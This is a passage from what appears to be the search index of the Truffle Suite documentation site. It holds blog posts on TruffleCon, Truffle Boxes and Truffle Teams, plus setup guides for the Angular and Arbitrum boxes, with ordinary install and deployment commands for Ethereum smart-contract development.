as well as the transaction address. We can also look this up on the ropsten explorer . Notice that upon completion, a payment of 1 LINK was sent during the transaction, clearly indicating that our contract has properly been funded. Next, we can now request data from the contract by running: npx truffle exec scripts/request-data.js --network live _In the Chainlink explorer for the network that you made the request (in our example we use Ropsten, but it would work similarly for Rinkeby, Kovan, and Mainnet). As you can see the Chainlink node that we were requesting data from picked up our request and waited for 3 block confirmations before executing the job. We are now ready to read the contract\u2019s state with the written answer from the Chainlink node, indicated by the fulfillment transaction (highlighted in red)._ And finally, for reading the data we run our read-contract script. In particular, this will run faster because we\u2019re not creating a transaction, we are simply reading the current state of the smart contract. npx truffle exec scripts/read-contract.js --network live Notice for our output when reading the data, we get a number displaying the current price of LINK in USD * 100 (as of writing, 22094). This is due to the value of times specified in our smart contract request-data.js. _Request-data.js. TRUFFLE_CL_BOX_TIMES is an environment variable which is used to override the default value of 100. This value is used for the precision of the endpoint\u2019s response (in this case, for the price of ETH in USD), and also because Solidity cannot handle decimals. Any of these values can be changed for your project._ Thanks to the power of Truffle, it has never been easier to work with smart contract development. We hope you enjoyed working with our Chainlink Truffle Box, allowing you to fully test, deploy, and interact with contracts on the network. Thanks for reading, and stay tuned for future updates at https://blog.chain.link/ .","title":"Migration"},{"location":"blog/why-i-love-trufflecon/index.html","text":"By Josh Quintal, Head of Product & Marketing The blockchain space is hitting a plateau. It\u2019s not a bad thing: new technologies encounter a series of plateaus and this one's no different. It\u2019s a good time to reflect and mature the ecosystem without the noise brought by rapid growth. We're in a crucible period not seen since the tech boom of the 90s. The early adopters are all here forging the blockchain-enabled world, readying for the next influx of users and companies. Remember when your friends and family raised eyebrows about this chainblock (or whatever) or thought Bitcoin was some kind of scam? Isn't that used to buy drugs? \ud83d\ude33 Now blockchain technology is becoming more efficient, more ubiquitous, and more accessible with each passing day. Now we hear things like \"blockchain is the future\" coming from outside our community. Almost two years ago when Truffle reached 4 people and that future seemed less sure, we were on our second retreat at a little place in Yakima. We mused about putting on a blockchain developer conference. Would people actually go? Who's going to speak? Can we get enough content? A few months later we decided to give it a try. Wow, people showed up--and not just that--they loved it! So many great conversations, so much valuable knowledge! Talks about smart contract upgrades, novel uses of merkle proofs, and data storage with IPFS just to name a few. A quietly skeptical Dave Burela (Blockchain Dev, MSFT and TruffleCon 2018 speaker) noted afterwards \"You actually pulled it off\". \ud83d\ude42 This year we have over 60 speakers across 60 sessions including: Thomas Hodges on Decentralized Oracles: Reliably Triggering Smart Contracts using Decentralized Computation using Truffle, Alejandro Banzas on RSK Integration with Ganache, and Greg Kapka on Developing Data-Rich Smart Contracts via Provable (Oraclize 2.0). TruffleCon is a conference, sure, but it's more than that: it's the feeling of excitement when learning a new technology; the eureka we felt when first discovering this new frontier. It's connections made in minutes that can last a lifetime. It's the culmination of everything we've worked for since the founding of this company. I hope to not only see you there but to have a chat about what we do well and how we can improve (you'll also get a hat). Together we're building the community that will take us from this plateau onward to the next meteoric growth spurt. Sincerely, Josh Quintal","title":"Why I love TruffleCon"},{"location":"blog/why-were-organizing-trufflecon-2018/index.html","text":"As you have hopefully heard by now, TruffleCon , Truffle's first-ever user conference, will be on October 5-7, 2018 in Portland, Oregon, U.S.A . Buy Tickets! Why TruffleCon? \u00b6 There is certainly no shortage of conferences related to Ethereum. Ethereal recently wrapped up in New York City, and Devcon4 is ramping up in Prague later on this year. There's also EDCON , EthCC , and plenty more, especially when you count those that intersect with the larger blockchain space. And yet, these events usually have a focus on the larger ecosystem. What about the people who are deep in the trenches, building the dapps and deploying the contracts? We want TruffleCon to be the place for people who are doing the building. Also, many developers are working in silos, connected to other teams only by GitHub, Gitter, StackExchange, Reddit, or other \" weak ties \". We want to strengthen those connections to bring people together . We want people to share their ideas, and talk about their successes and challenges. We want people to promote their projects, of course, and professional networking is always a part of these events, but more than anything else, we want people to be heard . Why now? \u00b6 We've noticed a shift over the past year or so in the usage of Truffle. Whereas many of the comments and requests in our Gitter channel and GitHub issues were originally regarding local tests, and in sandboxes, we noticed more and more people deploying their contracts to the public test networks and even the mainnet. While this, of course, was always the intention, it shows that confidence in our tools and the Ethereum ecosystem is growing . We want to help people \"go live\". And so we believe that there has never been a better time than now. Why Portland? \u00b6 Portland is a vibrant city full of world-class food and drink, unmatched outdoor opportunities, and an excellent transportation system for getting where you need to go. And early October is typically a sweet spot where the days are still warm and dry, while the fall colors are starting to come into view. If you've never been, you're missing out. And why not stay awhile once you're here? Photo courtesy of Flickr/sama093. Large version here . See you in October! \u00b6 From Truffle founder Tim Coulter: \"The best conference we could put on is one where there's a ton of active engagement. I want people to feel like they are surrounded by other people who can help them. And I want them to leave feeling like they learned something and that the Truffle community is better off because they were there. If we do it right, people will go home inspired, and will change how they do their development.\" We can't wait to see you there. If you have questions, feel free to tweet us at @trufflesuite . And please use the hashtag #TruffleCon . Buy Tickets! Mike Pumphrey is an Enterprise Trainer at ConsenSys working on the Truffle team. With over a dozen years of experience in documentation, support, and training, Mike is passionate about making technical concepts understandable to a wider audience. Mike is also the lead organizer for TruffleCon 2018.","title":"Why We're Organizing TruffleCon 2018"},{"location":"blog/why-were-organizing-trufflecon-2018/index.html#why-trufflecon","text":"There is certainly no shortage of conferences related to Ethereum. Ethereal recently wrapped up in New York City, and Devcon4 is ramping up in Prague later on this year. There's also EDCON , EthCC , and plenty more, especially when you count those that intersect with the larger blockchain space. And yet, these events usually have a focus on the larger ecosystem. What about the people who are deep in the trenches, building the dapps and deploying the contracts? We want TruffleCon to be the place for people who are doing the building. Also, many developers are working in silos, connected to other teams only by GitHub, Gitter, StackExchange, Reddit, or other \" weak ties \". We want to strengthen those connections to bring people together . We want people to share their ideas, and talk about their successes and challenges. We want people to promote their projects, of course, and professional networking is always a part of these events, but more than anything else, we want people to be heard .","title":"Why TruffleCon?"},{"location":"blog/why-were-organizing-trufflecon-2018/index.html#why-now","text":"We've noticed a shift over the past year or so in the usage of Truffle. Whereas many of the comments and requests in our Gitter channel and GitHub issues were originally regarding local tests, and in sandboxes, we noticed more and more people deploying their contracts to the public test networks and even the mainnet. While this, of course, was always the intention, it shows that confidence in our tools and the Ethereum ecosystem is growing . We want to help people \"go live\". And so we believe that there has never been a better time than now.","title":"Why now?"},{"location":"blog/why-were-organizing-trufflecon-2018/index.html#why-portland","text":"Portland is a vibrant city full of world-class food and drink, unmatched outdoor opportunities, and an excellent transportation system for getting where you need to go. And early October is typically a sweet spot where the days are still warm and dry, while the fall colors are starting to come into view. If you've never been, you're missing out. And why not stay awhile once you're here? Photo courtesy of Flickr/sama093. Large version here .","title":"Why Portland?"},{"location":"blog/why-were-organizing-trufflecon-2018/index.html#see-you-in-october","text":"From Truffle founder Tim Coulter: \"The best conference we could put on is one where there's a ton of active engagement. I want people to feel like they are surrounded by other people who can help them. And I want them to leave feeling like they learned something and that the Truffle community is better off because they were there. If we do it right, people will go home inspired, and will change how they do their development.\" We can't wait to see you there. If you have questions, feel free to tweet us at @trufflesuite . And please use the hashtag #TruffleCon . Buy Tickets! Mike Pumphrey is an Enterprise Trainer at ConsenSys working on the Truffle team. With over a dozen years of experience in documentation, support, and training, Mike is passionate about making technical concepts understandable to a wider audience. Mike is also the lead organizer for TruffleCon 2018.","title":"See you in October!"},{"location":"blog/you-can-now-make-your-own-truffle-box/index.html","text":"Two months ago we unveiled official integration with Truffle Boxes , example Ethereum applications and/or boilerplates that put complimentary tools and libraries into sweet, easily-downloadable packages. In addition to rolling out some official boxes, Status.im released the first community-supported box . Today we're happy to announce anyone can now make their very own Truffle Box! Making a Box \u00b6 To get started making a box, we've added a page to our documentation . For those starting a new box from scratch, we've also created a blueprint Truffle Box to get you started quickly. The First Wave \u00b6 We included a call for pre-screening in the community section of our first box rollout and some trailblazers answered the call! Here are the first community boxes: Quintor/angular-truffle-box This Truffle Box provides a base for working with the Truffle Framework and Angular. It provides a basic working example of the MetaCoin contracts with Angular components. This project is generated with Angular CLI. hackingbeauty/react-dapp-material-ui In addition to Webpack and React, this box adds: React-Router, Redux and Material-UI for easy skinning of a Dapp. antony/svelte-box A Truffle box using SvelteJS and Rollup. This box contains everything you need to start building a smart-contract app. kierenh/vue-dark-chocolate A truffle box that comes with everything you need to start using smart contracts from a Vue App with Bootstrap styling and components. Supporting frameworks include Vuex, Vue-Router & Bootstrap 4 (via Bootstrap-Vue) and webpack. The sample uses webpack-dev-server for hot-reloading or you can build and serve from express. Check out the full list of boxes here . A huge thank you to our entire community! We're humbled by your dedication and excited to see what's in store for the future. -- Josh & the Truffle Team","title":"You Can Now Make Your Own Truffle Box"},{"location":"blog/you-can-now-make-your-own-truffle-box/index.html#making-a-box","text":"To get started making a box, we've added a page to our documentation . For those starting a new box from scratch, we've also created a blueprint Truffle Box to get you started quickly.","title":"Making a Box"},{"location":"blog/you-can-now-make-your-own-truffle-box/index.html#the-first-wave","text":"We included a call for pre-screening in the community section of our first box rollout and some trailblazers answered the call! Here are the first community boxes: Quintor/angular-truffle-box This Truffle Box provides a base for working with the Truffle Framework and Angular. It provides a basic working example of the MetaCoin contracts with Angular components. This project is generated with Angular CLI. hackingbeauty/react-dapp-material-ui In addition to Webpack and React, this box adds: React-Router, Redux and Material-UI for easy skinning of a Dapp. antony/svelte-box A Truffle box using SvelteJS and Rollup. This box contains everything you need to start building a smart-contract app. kierenh/vue-dark-chocolate A truffle box that comes with everything you need to start using smart contracts from a Vue App with Bootstrap styling and components. Supporting frameworks include Vuex, Vue-Router & Bootstrap 4 (via Bootstrap-Vue) and webpack. The sample uses webpack-dev-server for hot-reloading or you can build and serve from express. Check out the full list of boxes here . A huge thank you to our entire community! We're humbled by your dedication and excited to see what's in store for the future. -- Josh & the Truffle Team","title":"The First Wave"},{"location":"blog/you-decide-pipeline-or-table-view-in-truffle-teams-deployments-manager/index.html","text":"With Truffle Teams, you can manage multiple deployed instances of your smart contracts across different networks. We\u2019ve heard mixed feedback about this workflow and are updating it accordingly: adding a table view and a deployment details page. We're also offering more insight into each deployment, by providing the cost and console output. What\u2019s New with Deployments? \u00b6 Our first iteration of Visual Deployments revolved around a pipeline view, with your commits on the left hand side and a production network on the right. While some do use and appreciate this type of workflow, many have only a single production instance, and having an entire column just for this doesn\u2019t make sense for those use cases. With that in mind, we\u2019re offering a new table view, so you can see all of your deployed instances even more quickly and in an uncluttered way. In the future, you\u2019ll also be able to sort and filter this table for even easier access. The new deployments table view--you can still access the card view via the toggle switch in the upper-right. You\u2019ll also notice that clicking the name of a deployment now goes to a new deployment details screen. This contains the current status of the deployment along with its console output (an oft-requested addition)! The deployment details screen. Notice you can now access the console output! For more information on the new deployments screen, check out the Truffle Teams Deployments docs . CHECK OUT THE DEPLOYMENTS MANAGER Thoughts? \u00b6 We want Truffle Teams to be the most effective DevOps tool in the blockchain space for both new and existing teams. Let us know what you think about the new deployment views, or if your team has other needs we haven\u2019t met yet. Continue the conversation with your fellow Trufflers in our Slack community! SIGN UP FOR THE TRUFFLER SLACK Thanks! Josh Quintal, Head of Product & Marketing","title":"You Decide - Pipeline or Table View in Truffle Teams' Refreshed Deployments Manager"},{"location":"blog/you-decide-pipeline-or-table-view-in-truffle-teams-deployments-manager/index.html#whats-new-with-deployments","text":"Our first iteration of Visual Deployments revolved around a pipeline view, with your commits on the left hand side and a production network on the right. While some do use and appreciate this type of workflow, many have only a single production instance, and having an entire column just for this doesn\u2019t make sense for those use cases. With that in mind, we\u2019re offering a new table view, so you can see all of your deployed instances even more quickly and in an uncluttered way. In the future, you\u2019ll also be able to sort and filter this table for even easier access. The new deployments table view--you can still access the card view via the toggle switch in the upper-right. You\u2019ll also notice that clicking the name of a deployment now goes to a new deployment details screen. This contains the current status of the deployment along with its console output (an oft-requested addition)! The deployment details screen. Notice you can now access the console output! For more information on the new deployments screen, check out the Truffle Teams Deployments docs . CHECK OUT THE DEPLOYMENTS MANAGER","title":"What\u2019s New with Deployments?"},{"location":"blog/you-decide-pipeline-or-table-view-in-truffle-teams-deployments-manager/index.html#thoughts","text":"We want Truffle Teams to be the most effective DevOps tool in the blockchain space for both new and existing teams. Let us know what you think about the new deployment views, or if your team has other needs we haven\u2019t met yet. Continue the conversation with your fellow Trufflers in our Slack community! SIGN UP FOR THE TRUFFLER SLACK Thanks! Josh Quintal, Head of Product & Marketing","title":"Thoughts?"},{"location":"boxes/index.html","text":"","title":"Truffle Suite"},{"location":"boxes/AngularTruffleDapp/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS angulartruffledapp CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"\\n![Logo](https://i.ibb.co/TkzPNnk/1-CIJ0-LEa6-ZR17-GFZSjy2ce-Q.png)\\n\\n# Angular + Truffle = \\xf0\\x9f\\x92\\x93 \\xc3\\x90APPS\\nThis Trufflebox provides a base for Truffle Framework and Angular DAPP. and you can make transactions between accounts and scale you app with beautiful material design \\n\\n\\nThis was generated with [Angular CLI](https://github.com/angular/angular-cli) version 11.2.1\\n\\n\\n## Development server\\n\\nRun `ng serve` for a dev server. Navigate to `http://localhost:4200/`. The app will automatically reload if you change any of the source files.\\n\\n## Code scaffolding\\n\\nRun `ng generate component component-name` to generate a new component. You can also use `ng generate directive|pipe|service|class|guard|interface|enum|module`.\\n\\n## Build\\n\\n1. Install truffle, Angular CLI and an Ethereum client. If you don't have a test environment \\n ```bash\\n npm install -g truffle\\n npm install -g @angular/cli\\n npm install -g ganache-cli\\n ```\\n\\n2. Download the box.\\n ```bash\\n truffle unbox ng-es/angulartruffledapp\\n ```\\n\\n3. Run your Ethereum client. For Ganache CLI:\\n ```bash\\n ganache-cli\\n ```\\nNote the mnemonic 12-word phrase printed on startup, you will need it later.\\n\\n4. Install the dependencies and Compile and migrate your contracts, into the directory Blockchain using :\\n ```bash\\n npm install \\n ```\\n5. Change the port in truffle-config.js\\n ```\\n change the port in truffle-config.js 8545 in windows the port is 7545 but in linux the defaul port is 8545\\n ```\\n6. Navigate into the Frontend Directory \\n ```bash\\n npm install & ng serve , And lets Buidl \\n ```\\n7. If you want to customize < ===\\n\\n+ __First__\\nChange the contract in Blockchain/contracts or make your own contract and compile and migrate\\n\\n+ __Second__\\nChange the app/service/contract.service.ts with your builded contract .json and you custom directives and functions\\n\\n\\n## __Common errors and their solutions__\\n\\n| Error | Solution |\\n|-------|----------|\\n| `Module not found: Error: Can't resolve '../../../../../Blockchain/build/contracts/Payment.json'` during `ng serve` | Run `truffle compile` |\\n| `Error: the tx doesn't have the correct nonce.` in MetaMask | Reset MetaMask: Settings -> Reset Account //Warning only with test accounts |\\n| `Error getting balance; see log.` in UI, with `Error: MetaCoin has not been deployed to detected network (network/artifact mismatch)` in browser console | Ensure you have started ganache, run `truffle migrate` and configured MetaMask to point to ganache | `Error: i cannot see my account or balance` Ensure you are logged in metamask and refresh | If you have a custom rcp in ganache you can change the dir in `src/app/contract/contract.service.ts line21 with your dir `| `Error: [ethjs-rpc] rpc error with payload` in Metamask | You may need update Ganache and restart metamask because some old vesions give 0 gas and the transaction is mark as underpriced the error givet is errot with payload we recomend use the newest version of ganache cli |\\n\\n\\n## Code contributions welcome!\\n\\n1. Fork it\\n2. Add new features\\n\\n```bash\\ngit checkout -b my-new-feature\\ngit commit -am 'Add some feature'\\ngit push origin my-new-feature\\n```\\n\\n3. Create a pull request\\n\"","title":"Index"},{"location":"boxes/angular-truffle-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS angular-truffle-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'# Truffle Box for Angular\\n\\nThis Truffle Box provides a base for working with the Truffle Framework and Angular.\\nIt provides a basic working example of the MetaCoin contracts with Angular components.\\nThis project is generated with [Angular CLI](https://cli.angular.io/).\\n\\n## Prerequisites\\n\\nIn order to run the Truffle box, you will need [Node.js](https://nodejs.org) (tested with version 10.x.y). This will include `npm`, needed\\nto install dependencies. In order install these dependencies, you will also need [Python](https://www.python.org) (version 2.7.x) and\\n[git](https://git-scm.com/downloads). You will also need the [MetaMask](https://metamask.io/) plugin for Chrome.\\n\\n## Building\\n\\n1. Install truffle, Angular CLI and an Ethereum client. If you don\\'t have a test environment, we recommend ganache-cli\\n ```bash\\n npm install -g truffle\\n npm install -g @angular/cli\\n npm install -g ganache-cli\\n ```\\n\\n2. Download the box.\\n ```bash\\n truffle unbox Quintor/angular-truffle-box\\n ```\\n\\n3. Run your Ethereum client. For Ganache CLI:\\n ```bash\\n ganache-cli\\n ```\\nNote the mnemonic 12-word phrase printed on startup, you will need it later.\\n\\n4. Compile and migrate your contracts.\\n ```bash\\n truffle compile && truffle migrate\\n ```\\n\\n## Configuration\\n1. In order to connect with the Ethereum network, you will need to configure MetaMask\\n2. Log into the `ganache-cli` test accounts in MetaMask, using the 12-word phrase printed earlier.\\n 1. A detailed explaination of how to do this can be found [here](https://truffleframework.com/docs/truffle/getting-started/truffle-with-metamask)\\n 1. Normally, the available test accounts will change whenever you restart `ganache-cli`.\\n 2. In order to receive the same test accounts every time you start `ganache-cli`, start it with a seed like this: `ganache-cli --seed 0` or `ganache-cli -m \"put your mnemonic phrase here needs twelve words to work with MetaMask\"`\\n3. Point MetaMask to `ganache-cli` by connecting to the network `localhost:8545` \\n\\n\\n## Running\\n\\n1. Run the app using Angular CLI:\\n ```bash\\n npm start\\n ```\\nThe app is now served on localhost:4200\\n\\n2. Making sure you have configured MetaMask, visit http://localhost:4200 in your browser.\\n\\n3. Send MetaCoins!\\n\\n## Testing\\n\\n1. Running the Angular component tests:\\n ```bash\\n ng test\\n ```\\n\\n2. Running the Truffle tests:\\n ```bash\\n truffle test\\n ```\\n\\n3. Running Protactor end-to-end tests\\n\\n ```bash\\n ng e2e\\n ```\\n## Releasing\\nUsing the Angular CLI you can build a distributable of your app. Will be placed in `dist/`\\n\\n ```bash\\n ng build\\n ```\\n\\n## FAQ\\n\\n* __Where can I find more documentation?__\\n\\nThis Truffle box is a union of [Truffle](http://truffleframework.com/) and an Angular setup created with [Angular CLI](https://cli.angular.io/).\\nFor solidity compilation and Ethereum related issues, try the [Truffle documentation](http://truffleframework.com/docs/).\\nFor Angular CLI and typescript issues, refer to the [Angular CLI documentation](https://github.com/angular/angular-cli/wiki)\\n\\n* __Common errors and their solutions__\\n\\n| Error | Solution |\\n|-------|----------|\\n| `Module not found: Error: Can\\'t resolve \\'../../../../build/contracts/MetaCoin.json\\'` during `ng serve` | Run `truffle compile` |\\n| `Error: the tx doesn\\'t have the correct nonce.` in MetaMask | Reset MetaMask: Settings -> Reset Account |\\n| `Error getting balance; see log.` in UI, with `Error: MetaCoin has not been deployed to detected network (network/artifact mismatch)` in browser console | Ensure you have started ganache, run `truffle migrate` and configured MetaMask to point to ganache |\\n\\n\\n\\n* __How do I get this to work on Windows?__\\n\\nPossible issues:\\n\\n- If you\\'re missing a C++ compiler, run `npm install --global --production windows-build-tools` in a cmd with administrative rights.\\n- If the `truffle.js` file opens when you\\'re trying to run truffle commands, rename the file to `truffle-config.js`\\n'","title":"Index"},{"location":"boxes/arbitrum/index.html","text":"Arbitrum Box \u00b6 Requirements Installation Setup Using the .env File New Configuration File New Directory Structure for Artifacts Arbitrum Compiling Migrating Basic Commands Testing Communication Between Ethereum and Arbitrum Chains Support Table of contents generated with markdown-toc This Truffle Arbitrum Box provides you with the boilerplate structure necessary to start coding for Arbitrum's Ethereum Layer 2 solution. For detailed information on how Arbitrum works, please see the documentation here . As a starting point, this box contains only the SimpleStorage Solidity contract. Including minimal code was a conscious decision as this box is meant to provide the initial building blocks needed to get to work on Arbitrum without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Solidity code against a variety of Arbitrum test networks. Arbitrum's Layer 2 solution is almost fully compatible with the EVM. You do not need a separate compiler to compile your Solidity contracts. The main difference between the EVM and the Arbitrum chain that developers will notice is that some opcodes are different and concepts such as time and gas are handled a little differently. Developers can use their regular Solidity compiler to compile contracts for Arbitrum. You can see the complete list of differences between the Arbitrum L2 chain and Ethereum here . Requirements \u00b6 The Arbitrum Box has the following requirements: Node.js 10.x or later NPM version 5.2 or later docker , version 19.03.12 or later docker-compose , version 1.27.3 or later Recommended Docker memory allocation of >=8 GB. Windows, Linux or MacOS Helpful, but optional: - An Infura account and Project ID - A MetaMask account Installation \u00b6 Note that this installation command will only work once the box is published (in the interim you can use truffle unbox https://github.com/truffle-box/arbitrum-box ). $ truffle unbox arbitrum Setup \u00b6 Using the env File \u00b6 You will need at least one mnemonic to use with the network. The .dotenv npm package has been installed for you, and you will need to create a .env file for storing your mnemonic and any other needed private information. The .env file is ignored by git in this project, to help protect your private data. In general, it is good security practice to avoid committing information about your private keys to github. The truffle-config.arbitrum.js file expects a MNEMONIC value to exist in .env for running commands on each of these networks, as well as a default MNEMONIC for the Arbitrum network we will run locally. If you are unfamiliar with using .env for managing your mnemonics and other keys, the basic steps for doing so are below: 1) Use touch .env in the command line to create a .env file at the root of your project. 2) Open the .env file in your preferred IDE 3) Add the following, filling in your own Infura project key and mnemonics: MNEMONIC=\"jar deny prosper gasp flush glass core corn alarm treat leg smart\" INFURA_KEY=\"<Your Infura Project ID>\" RINKEBY_MNEMONIC=\"<Your Rinkeby Mnemonic>\" MAINNET_MNEMONIC=\"<Your Arbitrum Mainnet Mnemonic>\" Note: the value for the MNEMONIC above is the one you should use, as it is expected within the local arbitrum network we will run in this Truffle Box. 4) As you develop your project, you can put any other sensitive information in this file. You can access it from other files with require('dotenv').config() and refer to the variable you need with process.env['<YOUR_VARIABLE>'] . New Configuration File \u00b6 A new configuration file exists in this project: truffle-config.arbitrum.js . This file contains a reference to the new file location of the contracts_build_directory and contracts_directory for Arbitrum contracts and lists several networks for running the Arbitrum Layer 2 network instance (see below ). Please note, the classic truffle-config.js configuration file is included here as well, because you will eventually want to deploy contracts to Ethereum as well. All normal truffle commands ( truffle compile , truffle migrate , etc.) will use this config file and save built files to build/ethereum-contracts . You can save Solidity contracts that you wish to deploy to Ethereum in the contracts/ethereum folder. New Directory Structure for Artifacts \u00b6 When you compile or migrate, the resulting json files will be at build/arbitrum-contracts/ . This is to distinguish them from any Ethereum contracts you build, which will live in build/ethereum-contracts . As we have included the appropriate contracts_build_directory in each configuration file, Truffle will know which set of built files to reference! Arbitrum \u00b6 Compiling \u00b6 To compile your Arbitrum contracts, run the following in your terminal: npm run compile:arbitrum This script lets Truffle know to use the truffle-config.arbitrum.js configuration file, which tells Truffle where to store your build artifacts. When adding new contracts to compile, you may find some discrepancies and errors, so please remember to keep an eye on differences between ethereum and Arbitrum ! If you would like to recompile previously compiled contracts, you can manually run this command with truffle compile --config truffle-config.arbitrum.js and add the --all flag. Migrating \u00b6 To migrate on Arbitrum, run: npm run migrate:arbitrum --network=(arbitrum_local | arbitrum_testnet | arbitrum_mainnet) (remember to choose a network from these options!). You have several Arbitrum networks to choose from, prepackaged in this box (note: Layer 1 networks are included in the regular truffle-config.js file, to aid you with further development. But here we'll just go through the Layer 2 deployment options available): arbitrum_local : This network is the default Layer 1/Layer 2 integration provided by Arbitrum for testing your Arbitrum-compatible code. Documentation about this setup can be found here . You will need to install the code for this network in this box in order to use the scripts associated with it. To install it, run npm run installLocalArbitrum . You should only need to run this initiation command once. It will create an arbitrum directory in this project that will house the repository you need. If at any point you want to update to the latest Arbitrum docker image, you can delete your arbitrum directory and run this command again. If you'd rather house the Arbitrum local blockchain outside of this box, see these notes for how to get started doing so. If you wish to use this network, follow these steps, in this order: 1) In a new terminal tab, enter npm run startLocalEthereum . 2) Wait for step #1 to complete. The Arbitrum Layer 2 blockchain depends on the existence of a Layer 1 for proper interoperability. 3) In another new terminal tab, enter npm run startLocalArbitrum . Wait a little while, and you will see the Arbitrum blockchain running and interacting with the Layer 1 simulation from step #1! You are ready to try out deploying your contracts! - arbitrum_testnet : Arbitrum has deployed a testnet to the Rinkeby network. The RPC endpoint is https://arbitrum-rinkeby.infura.io/v3/. In order to access this node for testing, you will need to connect a wallet (we suggest MetaMask ). Save your seed phrase in a .env file as RINKEBY_MNEMONIC . Using an .env file for the mnemonic is safer practice because it is listed in .gitignore and thus will not be committed. * Currently, we have the gasPrice for transactions on Arbitrum Rinkeby set to zero. You should be able to use this network as configured at this time. * In order to set up your MetaMask wallet to connect to the Arbitrum Rinkeby network, you will need to create a custom RPC network in your wallet. You can find detailed steps for this process here . You will need the following information: - RPC Url: https://arbitrum-rinkeby.infura.io/v3/ + <your infura key> - chain id: 421611 arbitrum_mainnet : This is the mainnet for Arbitrum's Layer 2 solution. You will need to connect your wallet to the Arbitrum mainnet RPC network, located at https://arbitrum-mainnet.infura.io/v3/ Layer 1 networks are included in the truffle-config.js file, but it is not necessary to deploy your base contracts to Layer 1 right now. Eventually, you will likely have a Layer 2 contract that you want to connect with a Layer 1 contract. One example is an ERC20 contract that is deployed on an Arbitrum network. At some point the user will wish to withdraw their funds into Ethereum. There will need to be a contract deployed on Layer 1 that can receive the message from Layer 2 to mint the appropriate tokens on Layer 1 for the user. More information on this system can be found here . If you would like to migrate previously migrated contracts on the same network, you can run truffle migrate --config truffle-config.arbitrum.js --network=(arbitrum_local | arbitrum_testnet | arbitrum_mainnet) and add the --reset flag. Basic Commands \u00b6 The code here will allow you to compile, migrate, and test your code against an Arbitrum instance. The following commands can be run (more details on each can be found in the next section): To compile: npm run compile:arbitrum To migrate: npm run migrate:arbitrum --network=(arbitrum_local | arbitrum_testnet | arbitrum_mainnet) To test: npm run test:arbitrum --network=(arbitrum_local | arbitrum_testnet | arbitrum_mainnet) Testing \u00b6 Currently, this box supports testing via Javascript/TypeScript tests. In order to run the test currently in the boilerplate, use the following command: npm run test:arbitrum --network=(arbitrum_local | arbitrum_testnet | arbitrum_mainnet) Remember that there are some differences between Arbitrum and Ethereum, and refer to the Arbitrum documentation if you run into test failures. Communication Between Ethereum and Arbitrum Chains \u00b6 The information above should allow you to deploy to an Arbitrum Layer 2 chain. This is only the first step! Once you are ready to deploy your own contracts to function on Layer 1 using Layer 2, you will need to be aware of the ways in which Layer 1 and Layer 2 interact in the Arbitrum ecosystem . Keep an eye out for additional Truffle tooling and examples that elucidate this second step to full Arbitrum integration! Support \u00b6 Support for this box is available via the Truffle community available here .","title":"Arbitrum Box"},{"location":"boxes/arbitrum/index.html#arbitrum-box","text":"Requirements Installation Setup Using the .env File New Configuration File New Directory Structure for Artifacts Arbitrum Compiling Migrating Basic Commands Testing Communication Between Ethereum and Arbitrum Chains Support Table of contents generated with markdown-toc This Truffle Arbitrum Box provides you with the boilerplate structure necessary to start coding for Arbitrum's Ethereum Layer 2 solution. For detailed information on how Arbitrum works, please see the documentation here . As a starting point, this box contains only the SimpleStorage Solidity contract. Including minimal code was a conscious decision as this box is meant to provide the initial building blocks needed to get to work on Arbitrum without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Solidity code against a variety of Arbitrum test networks. Arbitrum's Layer 2 solution is almost fully compatible with the EVM. You do not need a separate compiler to compile your Solidity contracts. The main difference between the EVM and the Arbitrum chain that developers will notice is that some opcodes are different and concepts such as time and gas are handled a little differently. Developers can use their regular Solidity compiler to compile contracts for Arbitrum. You can see the complete list of differences between the Arbitrum L2 chain and Ethereum here .","title":"Arbitrum Box"},{"location":"boxes/arbitrum/index.html#requirements","text":"The Arbitrum Box has the following requirements: Node.js 10.x or later NPM version 5.2 or later docker , version 19.03.12 or later docker-compose , version 1.27.3 or later Recommended Docker memory allocation of >=8 GB. Windows, Linux or MacOS Helpful, but optional: - An Infura account and Project ID - A MetaMask account","title":"Requirements"},{"location":"boxes/arbitrum/index.html#installation","text":"Note that this installation command will only work once the box is published (in the interim you can use truffle unbox https://github.com/truffle-box/arbitrum-box ). $ truffle unbox arbitrum","title":"Installation"},{"location":"boxes/arbitrum/index.html#setup","text":"","title":"Setup"},{"location":"boxes/arbitrum/index.html#using-the-env-file","text":"You will need at least one mnemonic to use with the network. The .dotenv npm package has been installed for you, and you will need to create a .env file for storing your mnemonic and any other needed private information. The .env file is ignored by git in this project, to help protect your private data. In general, it is good security practice to avoid committing information about your private keys to github. The truffle-config.arbitrum.js file expects a MNEMONIC value to exist in .env for running commands on each of these networks, as well as a default MNEMONIC for the Arbitrum network we will run locally. If you are unfamiliar with using .env for managing your mnemonics and other keys, the basic steps for doing so are below: 1) Use touch .env in the command line to create a .env file at the root of your project. 2) Open the .env file in your preferred IDE 3) Add the following, filling in your own Infura project key and mnemonics: MNEMONIC=\"jar deny prosper gasp flush glass core corn alarm treat leg smart\" INFURA_KEY=\"<Your Infura Project ID>\" RINKEBY_MNEMONIC=\"<Your Rinkeby Mnemonic>\" MAINNET_MNEMONIC=\"<Your Arbitrum Mainnet Mnemonic>\" Note: the value for the MNEMONIC above is the one you should use, as it is expected within the local arbitrum network we will run in this Truffle Box. 4) As you develop your project, you can put any other sensitive information in this file. You can access it from other files with require('dotenv').config() and refer to the variable you need with process.env['<YOUR_VARIABLE>'] .","title":"Using the env File"},{"location":"boxes/arbitrum/index.html#new-configuration-file","text":"A new configuration file exists in this project: truffle-config.arbitrum.js . This file contains a reference to the new file location of the contracts_build_directory and contracts_directory for Arbitrum contracts and lists several networks for running the Arbitrum Layer 2 network instance (see below ). Please note, the classic truffle-config.js configuration file is included here as well, because you will eventually want to deploy contracts to Ethereum as well. All normal truffle commands ( truffle compile , truffle migrate , etc.) will use this config file and save built files to build/ethereum-contracts . You can save Solidity contracts that you wish to deploy to 